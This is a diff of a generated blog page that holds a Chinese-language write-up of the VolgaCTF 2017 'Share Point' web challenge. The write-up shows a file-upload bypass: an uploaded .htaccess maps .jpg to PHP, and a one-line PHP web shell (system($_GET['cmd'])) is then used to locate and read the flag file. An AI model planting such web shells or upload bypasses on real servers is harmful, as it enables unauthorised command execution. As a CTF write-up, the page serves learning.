@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="VolgaCTF 2017 Quals,Web," />
+  <meta name="keywords" content="Web,VolgaCTF 2017 Quals," />
 
 
 
@@ -398,11 +398,11 @@ flag’s location is optimal">
 <h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>這個網站可以讓人上傳檔案到自己帳號，還可以把檔案分享給另一個帳號。我們可以決定要不要收被分享的檔案，收了就會把該檔案加進自己帳號的檔案夾內。上傳檔案的部分會把<code>.php</code>, <code>.html</code>副檔名的檔案擋掉。<br>檔案資料夾路徑：<code>http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/&lt;檔案名稱&gt;</code></p>
 <p>這題卡了很久，一直在找share功能是不是有能exploit的方法，試到最後只知道能把server上的檔案 (Ex: <code>../../index.php</code>) share給其他帳號。可是php檔案會被直接執行，所以也拿不到source code，也試了下拿<code>.htaccess</code>，可是讀取會得到status 403，然後就沒有然後了… QAQ</p>
 <p>賽後才找到了方法，正解是我們可以上傳<code>.htaccess</code>檔案，稍微參考了一下DigitalOcean的 <a href="https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file" target="_blank" rel="external">How To Use the .htaccess File</a>，還有這篇 <a href="https://www.php5.idv.tw/html.php?mod=article&amp;do=show&amp;shid=39" target="_blank" rel="external">[設定] PHP安裝之後APACHE之設定</a>，顯示我們可以用<code>AddType</code>來讓不同副檔名的檔案當作php來執行。</p>
-<p>在<code>.htaccess</code>裡寫下這行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType application/x-httpd-php .jpg</div></pre></td></tr></table></figure></p>
+<p>在<code>.htaccess</code>裡寫下這行：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</div></pre></td></tr></table></figure></p>
 <p>上傳到網站上，路徑會是 <code>http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/.htaccess</code>，這就表示在我們帳號下資料夾內的<code>jpg</code>檔案能當<code>php</code>執行了！！！</p>
-<p>再來建個<code>shell.jpg</code>，裡面放php shell code：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php echo system($_GET[&apos;cmd&apos;]); ?&gt;</div></pre></td></tr></table></figure></p>
-<p>上傳！大功告成！<br>可以先用 locate 找 flag 的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/shell.jpg?cmd=locate flag</div></pre></td></tr></table></figure></p>
-<p>找到flag的位置在 <code>/opt/flag.txt</code>，最後就是cat出來啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/shell.jpg?cmd=cat /opt/flag.txt</div></pre></td></tr></table></figure></p>
+<p>再來建個<code>shell.jpg</code>，裡面放php shell code：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> system($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
+<p>上傳！大功告成！<br>可以先用 locate 找 flag 的位置：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">http</span>://share-point.quals<span class="number">.2017</span>.volgactf.ru/<span class="built_in">files</span>/&lt;帳號名稱&gt;/<span class="built_in">shell</span>.jpg?cmd=locate flag</div></pre></td></tr></table></figure></p>
+<p>找到flag的位置在 <code>/opt/flag.txt</code>，最後就是cat出來啦<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://share-point.quals.<span class="number">2017</span>.volgactf.<span class="keyword">ru</span>/<span class="keyword">files</span>/&lt;帳號名稱&gt;/<span class="keyword">shell</span>.jpg?cmd=<span class="keyword">cat</span> /<span class="keyword">opt</span>/flag.txt</div></pre></td></tr></table></figure></p>
 <p>Flag: <code>VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}</code></p>
 
       
@@ -427,9 +427,9 @@ flag’s location is optimal">
       
         <div class="post-tags">
           
-            <a href="/tags/VolgaCTF-2017-Quals/" rel="tag"># VolgaCTF 2017 Quals</a>
-          
             <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/VolgaCTF-2017-Quals/" rel="tag"># VolgaCTF 2017 Quals</a>
           
         </div>
       
